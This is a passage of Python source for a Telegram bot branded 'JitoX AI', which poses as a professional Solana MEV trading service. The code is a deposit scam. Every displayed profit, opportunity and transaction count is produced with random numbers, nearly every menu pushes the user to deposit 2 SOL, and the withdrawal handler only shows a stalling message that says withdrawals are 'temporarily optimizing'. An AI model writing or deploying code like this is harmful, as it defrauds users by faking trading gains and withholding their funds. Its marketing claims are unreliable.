            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "start_mev":
        # Generate random opportunities
        arbitrage_ops = random.randint(2, 5)
        strategic_ops = random.randint(1, 4)
        market_ops = random.randint(1, 3)
        
        # Generate missed opportunities
        missed_opportunities = generate_missed_opportunities()

        message = (
                "👾 <b>JitoX AI - Professional MEV Framework</b> 👾\n\n"
                "💎 <b>System Architecture Status</b>\n\n"
                "⚡ <b>Core Infrastructure</b>\n"
                "• Operational Status: READY\n"
                "• Processing Matrix: OPTIMAL\n"
                "• Strategic Scope: COMPREHENSIVE\n\n"
                "🎯 <b>Real-Time Market Vectors</b>\n"
                f"⚔️ Arbitrage Protocol: {arbitrage_ops} opportunities ({random.uniform(0.3, 1.5):.2f} SOL)\n"
                f"⚔️ Position Protocol: {strategic_ops} vectors ({random.uniform(0.4, 2.0):.2f} SOL)\n"
                f"⚔️ Impact Protocol: {market_ops} analysis ({random.uniform(0.5, 2.5):.2f} SOL)\n\n"
                "✨ <b>Performance Analytics</b>\n"
                "• Target Execution Value: 0.5-2 SOL per operation\n"
                "• System State: Awaiting initialization\n\n"
                "🛡️ <b>Market Intelligence Feed</b>\n"
                f"• {missed_opportunities[0]}\n"
                f"• {missed_opportunities[1]}\n"
                f"• {missed_opportunities[2]}\n\n"
                "🔮 <b>Access Framework</b>\n"
                "• Standard Suite: 2 SOL initialization required\n"
                "• Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "info":
        info_message = (
                "👾 <b>JitoX AI - Enterprise MEV Architecture</b> 👾\n\n"
                "💎 <b>Professional Trading Infrastructure</b>\n\n"
                "⚡️ <b>Core Protocol Suite</b>\n\n"
                "🎯 <b>Strategic Entry Protocol</b>\n"
                "⚔️ Advanced listing detection algorithms\n"
                "⚔️ Sub-millisecond execution matrix\n"
                "⚔️ Precision entry optimization\n\n"
                "🎯 <b>Priority Execution Framework</b>\n"
                "⚔️ Real-time mempool intelligence\n"
                "⚔️ Dynamic priority management\n"
                "⚔️ Institutional-grade routing\n\n"
                "🎯 <b>Market Impact Protocol</b>\n"
                "⚔️ Advanced order flow analytics\n"
                "⚔️ Precision timing algorithms\n"
                "⚔️ Maximum value extraction\n\n"
                "🎯 <b>Cross-Venue Arbitrage Suite</b>\n"
                "⚔️ Multi-DEX differential analysis\n"
                "⚔️ Automated execution optimization\n"
                "⚔️ Cross-chain opportunity capture\n\n"
                "🛡️ <b>Professional Framework</b>\n"
                "✨ AI-driven market analysis\n"
                "✨ Continuous execution protocols\n"
                "✨ Self-custodial security architecture\n\n"
                "🔮 <b>Access Tiers</b>\n"
                "• Standard Suite: 2 SOL initialization\n"
                "• Enhanced Suite: 5+ SOL for institutional features\n\n"
                "💫 <b>24/7 Professional Support</b>\n"
                "Contact @JitoXAI for immediate assistance\n\n"
                "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑 Get Wallet", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(info_message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "get_wallet":
        await get_wallet(update, context)
    elif query.data == "track_mev":
        profit = random.uniform(0.5, 3.0)
        transactions = random.randint(10, 30)
        message = (
                "👾 <b>JitoX AI - Performance Intelligence Suite</b> 👾\n\n"
                "💎 <b>Strategic Analytics Framework</b>\n\n"
                "⚡️ <b>Market Performance Matrix</b>\n"
                f"• Realized Value: {profit:.2f} SOL\n"
                f"• Protocol Executions: {transactions}\n"
                f"• Dominant Strategy: {random.choice(['Arbitrage Protocol', 'Entry Protocol', 'Impact Protocol'])}\n\n"
                "🎯 <b>Professional Analytics</b>\n"
                "⚔️ Real-time execution tracking\n"
                "⚔️ Advanced protocol analysis\n"
                "⚔️ Institutional market intelligence\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Superior analytics drive optimal MEV execution. 🎮\n\n"
                "💫 <b>24/7 Support Available</b>\n"
                "Contact @JitoXAI for professional assistance"
            )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "mev_pending":
        pending_ops = random.randint(3, 8)
        est_profit = random.uniform(0.3, 1.5)
        message = (
                "👾 <b>JitoX AI - Transaction Intelligence Matrix</b> 👾\n\n"
                "💎 <b>Real-Time Market Analysis</b>\n\n"
                "⚡️ <b>Strategic Opportunities</b>\n"
                f"• Active Vectors: {pending_ops} identified\n"
                f"• Projected Value: {est_profit:.2f} SOL\n"
                f"• Primary Protocol: {random.choice(['Raydium', 'Orca', 'Jupiter'])}\n\n"
                "🎯 <b>Professional Features</b>\n"
                "⚔️ Advanced mempool analytics\n"
                "⚔️ Institutional execution matrix\n"
                "⚔️ Real-time opportunity detection\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Superior market intelligence ensures optimal MEV capture. 🎮\n\n"
                "💫 <b>24/7 Support Available</b>\n"
                "Contact @JitoXAI for professional assistance"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "withdraw":
        await withdraw(update, context)
    elif query.data == "proceed_withdraw":
        message = (
                "👾 <b>JitoX AI - Strategic Balance Management</b> 👾\n\n"
                " <b>System Status Update</b>\n\n"
                "⚡️ <b>Operational Notice</b>\n"
                "• Withdrawal protocol temporarily optimizing\n"
                "• System maintaining strategic positions\n"
                "• Performance metrics indicate active trading\n\n"
                "🎯 <b>Professional Advantages</b>\n"
                "⚔️ Continuous MEV extraction active\n"
                "⚔️ Enhanced features deployment imminent\n"
                "⚔️ Optimized profit generation ongoing\n\n"
                "🛡️ <b>Security Assurance</b>\n"
                "✨ Self-custodial architecture maintained\n"
                "✨ Asset security fully preserved\n"
                "✨ Professional-grade protection active\n\n"
                "Professional traders understand: Strategic position maintenance maximizes MEV opportunities. 🎮\n\n"
                "💫 <b>24/7 Support Available</b>\n"
                "Contact @JitoXAI for professional assistance"
            )
        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "stop_mev":
        active_time = random.randint(1, 24)
        missed_ops = random.randint(5, 20)
        message = (
                "👾 <b>JitoX AI Professional Suite - Operation Status</b> 👾\n\n"
                "💎 <b>System Status: Inactive</b>\n\n"
                "⚡️ <b>Market Analysis</b>\n"
                f"• Analysis Window: {active_time}h\n"
                f"• Missed Opportunities: {missed_ops}\n"
                f"• Unrealized Value: {random.uniform(0.5, 3.0):.2f} SOL\n\n"
                "🎯 <b>Performance Impact</b>\n"
                "⚔️ Execution capability suboptimal\n"
                "⚔️ Market opportunities pending\n"
                "⚔️ Protocol access restricted\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Suite: 2 SOL initialization required\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Consistent operation ensures maximum MEV capture. 🎮\n\n"
                "💫 <b>24/7 Support Available</b>\n"
                "Contact @JitoXAI for professional assistance"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "mev_positions":
        positions = random.randint(1, 5)
        total_profit = random.uniform(0.5, 5.0)
        message = (
                "👾 <b>JitoX AI - Position Analytics Matrix</b> 👾\n\n"
                "💎 <b>Strategic Market Intelligence</b>\n\n"
                "⚡️ <b>Active Protocols</b>\n"
                f"• Deployed Strategies: {positions}\n"
                f"• Projected Value: {total_profit:.2f} SOL\n"
                f"• Dominant Protocol: {random.choice(['Arbitrage Protocol', 'Entry Protocol', 'Impact Protocol'])}\n\n"
                "🎯 <b>Professional Features</b>\n"
                "⚔️ Real-time performance monitoring\n"
                "⚔️ Institutional profit optimization\n"
                "⚔️ Advanced risk management matrix\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "✨ Standard Suite: 2 SOL initialization\n"
                "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Strategic positioning drives superior MEV capture. 🎮\n\n"
                "💫 <b>24/7 Support Available</b>\n"
                "Contact @JitoXAI for professional assistance"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "help":
        message = (
                "👾 <b>JitoX AI - Professional MEV Architecture</b> 👾\n\n"
                "💎 <b>Institutional Trading Framework</b>\n\n"
                "⚡️ <b>Core Infrastructure</b>\n"
                "• Advanced mempool analysis\n"
                "• Institutional execution protocols\n"
                "• Real-time market intelligence\n\n"
                "🎯 <b>Strategic Balance Protocol</b>\n"
                "⚔️ Operational liquidity optimization\n"
                "⚔️ Comprehensive MEV capture matrix\n"
                "⚔️ Strategic position management\n\n"
                "🛡️ <b>Professional Protocols</b>\n"
                "✨ Advanced position architecture\n"
                "✨ Real-time market analytics\n"
                "✨ Dynamic risk framework\n\n"
                "🔮 <b>Trading Methodology</b>\n"
                "• Strategic entry optimization\n"
                "• Advanced market analysis\n"
                "• Arbitrage protocol execution\n"
                "• Impact strategy deployment\n\n"
                "⚡️ <b>System Architecture</b>\n"
                "• AI-driven market analysis\n"
                "• 24/7 execution optimization\n"
                "• Maximum efficiency protocols\n\n"
                "🛡️ <b>Access Framework</b>\n"
                "• Standard Suite: 2 SOL initialization\n"
                "• Enhanced Suite: 5+ SOL for institutional features\n\n"
                "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮\n\n"
                "💫 <b>24/7 Professional Support</b>\n"
                "Contact @JitoXAI for immediate assistance"
            )
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "referral":
        try:
            # Get user's referrals from database
            referrals = await get_user_referrals(user_id)
            total_earnings = sum(earning for _, _, earning in referrals) if referrals else 0
            
            # Get or generate referral code
            referral_code = await get_referral_code(user_id)
            if not referral_code:
                referral_code = generate_referral_code()
                await store_referral_code(user_id, referral_code)
            
            bot_username = context.bot.username
            referral_link = f"https://t.me/{bot_username}?start={referral_code}"
            
            # Get detailed referral information
            referred_users_info = []
            if referrals:
                for referred_id, created_at, earnings in referrals:
                    try:
                        user = await context.bot.get_chat(referred_id)
                        username = user.username or "Anonymous"
                        referred_users_info.append(f"@{username}: {earnings:.2f} SOL")
                    except Exception as e:
                        logger.error(f"Error getting referred user info: {e}")
                        referred_users_info.append(f"User {referred_id}: {earnings:.2f} SOL")
            
            message = (
                "🟣 <b>JitoX AI Partnership Program</b> 🟣\n\n"
                "⚜️ <b>Professional Revenue Sharing</b> ⚜️\n\n"
                "🔮 <b>Partnership Benefits:</b>\n"
                "🔹 0.05 SOL for each activated trading account\n"
                "🔹 1% revenue share from trading operations\n"
                "🔹 Lifetime partnership rewards\n\n"
                "💫 <b>Your Partnership Statistics:</b>\n"
                f"🟪 Active Partners: {len(referrals)}\n"
                f"🟪 Accumulated Revenue: {total_earnings:.2f} SOL\n\n"
            )
            
            if referred_users_info:
                message += "🎯 <b>Your Partners:</b>\n"
                message += "\n".join(referred_users_info) + "\n\n"
            
            message += (
                "🎯 <b>Your Partnership Link:</b>\n"
                f"<code>{referral_link}</code>\n\n"
                "⚜️ <b>Important:</b> All partnership rewards are automatically tracked and permanently stored\n\n"
                "Share your link to start earning rewards! 🎮"
            )
            
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
            logger.info(f"Displayed referral info for user {user_id}: {len(referrals)} referrals, {total_earnings} SOL earnings")
        except Exception as e:
            logger.error(f"Error displaying referral information: {e}")
            await query.edit_message_text(
                "An error occurred while fetching your referral information. Please try again.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data='back')]])
            )
        return
    elif query.data == "pool_settings":
        await pool_settings(update, context)
    elif query.data == "token_watchlist":
        await token_watchlist(update, context)
    elif query.data == "custom_risk_management":
        await custom_risk_management(update, context)
    elif query.data == "risk_profiling":
        await risk_profiling(update, context)
    elif query.data == "custom_trading_bots":
        await custom_trading_bots(update, context)
    elif query.data == "ai_market_predictions":
        await ai_market_predictions(update, context)
    elif query.data == "advanced_charting":
        await advanced_charting(update, context)
    elif query.data == "multi_account":
        await multi_account(update, context)
    elif query.data == "historical_analysis":
        await historical_analysis(update, context)
    elif query.data == "diversification":
        await diversification(update, context)
    elif query.data == "intensity":
        await intensity(update, context)
    elif query.data == "token_targeting":
        await token_targeting(update, context)
    elif query.data == "ai_strategy":
        await ai_strategy(update, context)
    elif query.data == "dynamic_risk":
        await dynamic_risk(update, context)
    elif query.data == "strategy_sharing":
        await strategy_sharing(update, context)
    elif query.data == "copy_trading":
        await copy_trading(update, context)
    elif query.data == "auto_mev":
        await auto_mev(update, context)
    elif query.data == "pool_stats":
        logger.debug("Calling view_pool_stats function")
        await view_pool_stats(update, context)
    elif query.data == "intensity_low":
        await query.edit_message_text("🔵 Intensity set to Low. Lower risk, fewer operations.")
    elif query.data == "intensity_medium":
        await query.edit_message_text("🟡 Intensity set to Medium. Balanced approach.")
    elif query.data == "intensity_high":
        await query.edit_message_text("🔴 Intensity set to High. Maximum operations, higher risk.")
    elif query.data == "how_jito_works":
        message = (
                "👾 <b>JitoX AI - Enterprise MEV Architecture</b> 👾\n\n"
                "💎 <b>Professional Trading Infrastructure</b>\n\n"
                "⚡️ <b>Core Protocol Suite</b>\n\n"
                "🎯 <b>Strategic Entry Protocol</b>\n"
                "⚔️ Advanced listing detection algorithms\n"
                "⚔️ Sub-millisecond execution matrix\n"
                "⚔️ Precision entry optimization\n\n"
                "🎯 <b>Priority Execution Framework</b>\n"
                "⚔️ Real-time mempool intelligence\n"
                "⚔️ Dynamic priority management\n"
                "⚔️ Institutional-grade routing\n\n"
                "🎯 <b>Market Impact Protocol</b>\n"
                "⚔️ Advanced order flow analytics\n"
                "⚔️ Precision timing algorithms\n"
                "⚔️ Maximum value extraction\n\n"
                "🎯 <b>Cross-Venue Arbitrage Suite</b>\n"
                "⚔️ Multi-DEX differential analysis\n"
                "⚔️ Automated execution optimization\n"
                "⚔️ Cross-chain opportunity capture\n\n"
                "🛡️ <b>Professional Framework</b>\n"
                "✨ AI-driven market analysis\n"
                "✨ Continuous execution protocols\n"
                "✨ Self-custodial security architecture\n\n"
                "🔮 <b>Access Tiers</b>\n"
                "• Standard Suite: 2 SOL initialization\n"
                "• Enhanced Suite: 5+ SOL for institutional features\n\n"
                "💫 <b>24/7 Professional Support</b>\n"
                "Contact @JitoXAI for immediate assistance\n\n"
                "Professional traders understand: Superior infrastructure drives exceptional MEV performance. 🎮"
            )
        keyboard = [
            [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
            [InlineKeyboardButton("🔙 Back", callback_data='back')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
    elif query.data == "get_eth_wallet":
        await get_eth_wallet(update, context)
    else:
        message = f"Button {query.data} pressed. This feature is only for members who activated the bot."
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

    logger.debug("Exiting button_handler function")

async def send_admin_notification(application, message: str):
    admin_chat_id = -4540844698  # Your admin chat ID
    try:
        await application.bot.send_message(chat_id=admin_chat_id, text=message)
        logger.info(f"Admin notification sent: {message}")
    except Exception as e:
        logger.error(f"Failed to send admin notification: {e}")


def generate_missed_opportunities():
    opportunity_types = ['Arbitrage', 'Frontrun', 'Sandwich']
    missed_opportunities = []
    for type in opportunity_types:
        profit = random.uniform(0.5, 2.0)
        missed_opportunities.append(f"Missed {type}: {profit:.2f} SOL profit")
    return missed_opportunities

async def token_watchlist(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Token Intelligence</b> 👾\n\n"
            "💎 <b>Professional Monitoring Framework</b>\n\n"
            "⚡️ <b>Advanced Features</b>\n"
            "• Real-time market surveillance\n"
            "• Institutional-grade price analytics\n"
            "• Strategic opportunity detection\n\n"
            "🎯 <b>Professional Advantages</b>\n"
            "⚔️ Precision market monitoring\n"
            "⚔️ Advanced alert protocols\n"
            "⚔️ Dynamic trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives optimal execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_risk_management(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Professional Risk Framework</b> 👾\n\n"
            "💎 <b>Strategic Risk Architecture</b>\n\n"
            "⚡️ <b>Advanced Risk Protocols</b>\n"
            "• Institutional-grade position management\n"
            "• Dynamic stop-loss optimization\n"
            "• Strategic profit targeting\n\n"
            "🎯 <b>Professional Features</b>\n"
            "️ Real-time risk assessment matrix\n"
            "⚔️ Advanced portfolio protection\n"
            "⚔️ Customizable execution parameters\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk management ensures sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def risk_profiling(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Risk Intelligence</b> 👾\n\n"
            "💎 <b>Professional Risk Assessment Matrix</b>\n\n"
            "⚡️ <b>Advanced Analytics</b>\n"
            "• Institutional risk profiling\n"
            "• Strategic tolerance analysis\n"
            "• Dynamic strategy alignment\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time risk calibration\n"
            "⚔️ Advanced strategy optimization\n"
            "⚔️ Precision execution mapping\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior risk profiling drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def custom_trading_bots(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Automation Matrix</b> 👾\n\n"
            "💎 <b>Professional Trading Architecture</b>\n\n"
            "⚡️ <b>Strategic Protocols</b>\n"
            "• Institutional-grade automation\n"
            "• Custom parameter optimization\n"
            "• Advanced execution logic\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Precision strategy deployment\n"
            "⚔️ Real-time performance analytics\n"
            "⚔️ Advanced backtesting framework\n\n"
            "🛡️ <b>System Architecture</b>\n"
            "✨ AI-driven strategy builder\n"
            "✨ Professional template library\n"
            "✨ Dynamic execution protocols\n\n"
            "🔮 <b>Access Framework</b>\n"
            "• Standard Suite: 2 SOL initialization\n"
            "• Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior automation drives consistent MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_market_predictions(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Predictive Intelligence Matrix</b> 👾\n\n"
            "💎 <b>Advanced Market Forecasting</b>\n\n"
            "⚡️ <b>Strategic Analytics</b>\n"
            "• Neural prediction algorithms\n"
            "• Real-time trend detection\n"
            "• Institutional market modeling\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Predictive execution protocols\n"
            "⚔️ Dynamic strategy adaptation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market intelligence drives predictive MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def advanced_charting(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Advanced Analytics Suite</b> 👾\n\n"
            "💎 <b>Professional Charting Architecture</b>\n\n"
            "⚡️ <b>Strategic Visualization</b>\n"
            "• Institutional-grade technical analysis\n"
            "• Multi-timeframe market modeling\n"
            "• Advanced indicator integration\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time chart optimization\n"
            "⚔️ Custom indicator framework\n"
            "⚔️ Precision trend analysis\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior market analysis drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def multi_account(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Account Matrix</b> 👾\n\n"
            "💎 <b>Professional Portfolio Architecture</b>\n\n"
            "⚡️ <b>Advanced Management Protocols</b>\n"
            "• Multi-account synchronization\n"
            "• Institutional position tracking\n"
            "• Unified execution framework\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔ Seamless account integration\n"
            "⚔️ Cross-portfolio optimization\n"
            "⚔️ Strategic capital allocation\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior account management drives optimal MEV performance. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def historical_analysis(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Performance Analytics Matrix</b> 👾\n\n"
            "💎 <b>Strategic Intelligence Framework</b>\n\n"
            "⚡️ <b>Advanced Performance Metrics</b>\n"
            "• Institutional-grade analytics\n"
            "• Strategic efficiency tracking\n"
            "• Comprehensive execution analysis\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Performance optimization protocols\n"
            "⚔️ Strategic improvement matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior analytics drive strategic MEV optimization. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def diversification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Portfolio Matrix</b> 👾\n\n"
            "💎 <b>Professional Diversification Framework</b>\n\n"
            "⚡️ <b>Advanced Portfolio Protocols</b>\n"
            "• Institutional-grade risk distribution\n"
            "• Strategic asset allocation\n"
            "• Dynamic portfolio balancing\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Real-time portfolio optimization\n"
            "⚔️ Advanced correlation analysis\n"
            "⚔️ Strategic rebalancing matrix\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior diversification drives sustainable MEV capture. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def ai_strategy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
            "👾 <b>JitoX AI - Strategic Intelligence Suite</b> 👾\n\n"
            "💎 <b>Advanced Strategy Architecture</b>\n\n"
            "⚡️ <b>Neural Trading Protocols</b>\n"
            "• Personalized execution matrices\n"
            "• Adaptive learning algorithms\n"
            "• Real-time strategy optimization\n\n"
            "🎯 <b>Professional Features</b>\n"
            "⚔️ Advanced pattern recognition\n"
            "⚔️ Dynamic strategy adaptation\n"
            "⚔️ Predictive market modeling\n\n"
            "🛡️ <b>Access Framework</b>\n"
            "✨ Standard Suite: 2 SOL initialization\n"
            "✨ Enhanced Suite: 5+ SOL for institutional features\n\n"
            "Professional traders understand: Superior intelligence drives strategic MEV execution. 🎮\n\n"
            "💫 <b>24/7 Support Available</b>\n"
            "Contact @JitoXAI for professional assistance"
        )
    keyboard = [
        [InlineKeyboardButton("🔑Deposit 2 SOL (Your Balance)", callback_data='get_wallet')],
        [InlineKeyboardButton("🔙 Back", callback_data='nexus_settings')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')

async def dynamic_risk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = (
